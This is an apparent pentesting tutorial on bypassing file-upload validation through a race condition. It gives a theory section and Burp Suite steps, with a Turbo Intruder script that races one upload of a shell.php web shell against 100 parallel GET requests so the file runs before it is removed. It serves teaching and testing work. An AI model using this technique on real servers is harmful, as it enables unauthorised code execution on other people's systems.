# File Upload via Race Condition

## Theory

Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.

That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions that enable an attacker to completely bypass even the most robust validation.

For example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.

These vulnerabilities are often extremely subtle, making them difficult to detect during blackbox testing unless you can find a way to leak the relevant source code.

## Practice

For this case, we need to know the location of the folder where the files or images are uploaded. We can upload a simple image and then look for its location.

Then we **intercept with Burpsuite the upload of a malicious PHP** **file** (ex: **shell.php**) and **send it to Reapeter**. There we will see that we can only upload images (or another type of file, depending on the case).

**Right-click** on the **POST request** that was used to submit the file upload and select **Extensions > Turbo Intruder > Send to turbo intruder**. The Turbo Intruder window opens. Copy and paste the following script template into Turbo Intruder's Python editor:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=200,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(100):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

In the script, replace `<YOUR-POST-REQUEST>` with the entire POST request containing your **shell.php** file.

Replace `<YOUR-GET-REQUEST>` with a GET request for fetching your uploaded PHP file. The simplest way to do this is to copy the **GET /path/to/\<YOUR-IMAGE>** request from your proxy history, then change the filename in the path to **shell.php**.
